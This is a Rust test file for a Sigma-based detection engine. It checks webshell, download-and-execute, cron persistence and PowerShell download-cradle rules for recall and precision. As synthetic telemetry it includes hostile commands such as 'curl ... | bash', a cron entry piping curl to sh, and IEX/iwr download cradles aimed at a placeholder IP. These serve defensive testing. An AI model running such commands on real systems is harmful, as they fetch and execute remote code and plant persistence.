//! Do not remove these attack controls when deleting duplicate authored YAMLs.
//! Run with --ignored after integrating ACORE's builtin rewrites.
use detection::{compile_sigma_rule, EventClass, TelemetryEvent, TemporalEngine};
const BOOTSTRAP: &str = include_str!("../../agent-core/src/lifecycle/detection_bootstrap.rs");
fn target(name: &str) -> (TemporalEngine, String) {
    let marker = format!("const {name}: &str = r#\"");
    let yaml = BOOTSTRAP
        .split_once(&marker)
        .unwrap()
        .1
        .split_once("\"#;")
        .unwrap()
        .0;
    // Test-only platform bypass, identical compiler/qualification otherwise.
    let yaml = yaml.replace("  product: windows\n", "");
    let rule = compile_sigma_rule(&yaml).unwrap();
    let name = rule.name.clone();
    let mut engine = TemporalEngine::new();
    engine.add_rule(rule);
    (engine, name)
}
fn ev(class: EventClass, process: &str, parent: &str, command: &str) -> TelemetryEvent {
    serde_json::from_value(serde_json::json!({"ts_unix":1,"event_class":class,"pid":900,"ppid":1,"uid":1000,
        "process":process,"parent_process":parent,"session_id":900,"file_path":if process.ends_with(".exe") { format!(r"C:\Windows\System32\{process}") } else { format!("/usr/bin/{process}") },"file_write":false,
        "command_line":command,"container_escape":false,"container_privileged":false})).unwrap()
}
fn fires(name: &str, sequence: &[TelemetryEvent]) -> bool {
    let (mut engine, rule) = target(name);
    sequence.iter().enumerate().any(|(i, e)| {
        let mut e = e.clone();
        e.ts_unix += i as i64;
        engine.observe(&e).contains(&rule)
    })
}
fn webshell_cases(fires: fn(&str, &[TelemetryEvent]) -> bool) {
    let start = ev(EventClass::ProcessExec, "sh", "nginx", "sh -c id");
    let mut net = ev(EventClass::NetworkConnect, "sh", "nginx", "");
    net.dst_ip = Some("203.0.113.9".into());
    net.dst_port = Some(4444);
    assert!(fires("SIGMA_WEBSHELL", &[start.clone(), net.clone()]));
    assert!(!fires(
        "SIGMA_WEBSHELL",
        &[ev(
            EventClass::ProcessExec,
            "sh",
            "apache2",
            "sh -c 'convert a.png b.jpg'"
        )]
    ));
    net.dst_ip = Some("127.0.0.1".into());
    net.dst_port = Some(443);
    assert!(!fires("SIGMA_WEBSHELL", &[start, net]));
}
fn download_cases(fires: fn(&str, &[TelemetryEvent]) -> bool) {
    assert!(fires(
        "SIGMA_DOWNLOAD_EXEC",
        &[ev(
            EventClass::ProcessExec,
            "sh",
            "bash",
            "sh -c 'curl -s http://203.0.113.9/x.sh | bash'"
        )]
    ));
    assert!(!fires(
        "SIGMA_DOWNLOAD_EXEC",
        &[ev(
            EventClass::ProcessExec,
            "curl",
            "bash",
            "curl -O https://releases.example.org/tool.tgz"
        )]
    ));
}
fn unrelated_download_case(fires: fn(&str, &[TelemetryEvent]) -> bool) {
    let download = ev(
        EventClass::ProcessExec,
        "curl",
        "cron",
        "curl https://hc-ping.example/uuid",
    );
    let mut unrelated = ev(
        EventClass::ProcessExec,
        "bash",
        "sshd",
        "/bin/bash /home/synthetic/deploy.sh",
    );
    unrelated.pid = 901;
    assert!(!fires("SIGMA_DOWNLOAD_EXEC", &[download, unrelated]));
}

fn persistence_cases(fires: fn(&str, &[TelemetryEvent]) -> bool) {
    let mut write = ev(
        EventClass::FileOpen,
        "bash",
        "sshd",
        "bash -c 'echo curl http://203.0.113.9/x | sh > /etc/cron.d/upd'",
    );
    write.file_path = Some("/etc/cron.d/upd".into());
    write.file_write = true;
    assert!(fires("SIGMA_PERSISTENCE", &[write.clone()]));
    assert!(!fires(
        "SIGMA_PERSISTENCE",
        &[ev(
            EventClass::ProcessExec,
            "systemctl",
            "sudo",
            "systemctl enable --now docker"
        )]
    ));
    write.process = "dpkg".into();
    write.command_line = None;
    write.file_path = Some("/etc/cron.d/sysstat".into());
    assert!(!fires("SIGMA_PERSISTENCE", &[write]));
}
fn powershell_cases(fires: fn(&str, &[TelemetryEvent]) -> bool) {
    for command in ["powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')\"", "powershell -c \"iwr http://203.0.113.9/a.ps1 -UseBasicParsing | iex\""] {
        assert!(fires("SIGMA_WIN_PS_DOWNLOAD_CRADLE", &[ev(EventClass::ProcessExec, "powershell.exe", "explorer.exe", command)]));
    }
    for command in ["powershell.exe -c (New-Object Net.WebClient).DownloadString('https://api.ipify.org')", "powershell.exe -c Invoke-WebRequest https://vendor.example/tool.zip -OutFile C:\\Temp\\tool.zip"] {
        assert!(!fires("SIGMA_WIN_PS_DOWNLOAD_CRADLE", &[ev(EventClass::ProcessExec, "powershell.exe", "explorer.exe", command)]));
    }
}

fn pack_fires(_: &str, sequence: &[TelemetryEvent]) -> bool {
    let mut engine = TemporalEngine::with_default_rules();
    for line in BOOTSTRAP
        .lines()
        .map(str::trim)
        .filter(|line| line.starts_with("const SIGMA_"))
    {
        let name = line
            .split_whitespace()
            .nth(1)
            .unwrap()
            .trim_end_matches(':');
        let marker = format!("const {name}: &str = r#\"");
        let yaml = BOOTSTRAP
            .split_once(&marker)
            .unwrap()
            .1
            .split_once("\"#;")
            .unwrap()
            .0;
        let yaml = yaml.replace("  product: windows\n", "");
        match compile_sigma_rule(&yaml) {
            Ok(rule) => engine.add_rule(rule),
            Err(reason) => eprintln!("builtin {name} skipped: {reason}"),
        }
    }
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/sigma");
    let mut paths: Vec<_> = std::fs::read_dir(root)
        .unwrap()
        .map(|e| e.unwrap().path())
        .filter(|p| p.extension().and_then(|s| s.to_str()) == Some("yml"))
        .collect();
    paths.sort();
    for path in paths {
        let source = std::fs::read_to_string(path)
            .unwrap()
            .replace("  product: windows\n", "")
            .replace("  product: linux\n", "");
        engine.add_rule(compile_sigma_rule(&source).unwrap());
    }
    let mut hits = Vec::new();
    for (i, event) in sequence.iter().enumerate() {
        let mut event = event.clone();
        event.ts_unix += i as i64;
        hits.extend(engine.observe(&event));
    }
    if !hits.is_empty() {
        eprintln!("pack hits: {hits:?}");
    }
    !hits.is_empty()
}

#[test]
fn pack_webshell_recall_and_precision() {
    webshell_cases(pack_fires);
}

#[test]
fn merged_webshell_keeps_attack_and_excludes_local_or_no_connect_hooks() {
    webshell_cases(fires);
}

#[test]
fn pack_download_recall_and_precision() {
    download_cases(pack_fires);
}

#[test]
#[ignore = "RAFIX-INTEGRATION"]
fn merged_download_exec_keeps_pipe_attack_not_unrelated_shell() {
    download_cases(fires);
    unrelated_download_case(fires);
}

#[test]
fn pack_persistence_recall_and_precision() {
    persistence_cases(pack_fires);
}

#[test]
#[ignore = "RAFIX-INTEGRATION"]
fn merged_persistence_keeps_cron_write_not_package_or_service_administration() {
    persistence_cases(fires);
}

#[test]
fn pack_powershell_recall_and_precision() {
    powershell_cases(pack_fires);
}

#[test]
#[ignore = "RAFIX-INTEGRATION"]
fn merged_powershell_keeps_both_execution_forms_not_download_only() {
    powershell_cases(fires);
}

#[test]
#[ignore = "RAFIX-INTEGRATION-BLOCKER: base builtins phi_download_exec + eguard_builtin_download_exec fire on cron curl -> unrelated bash; owner ACORE"]
fn pack_download_unrelated_shell_is_quiet() {
    unrelated_download_case(pack_fires);
}
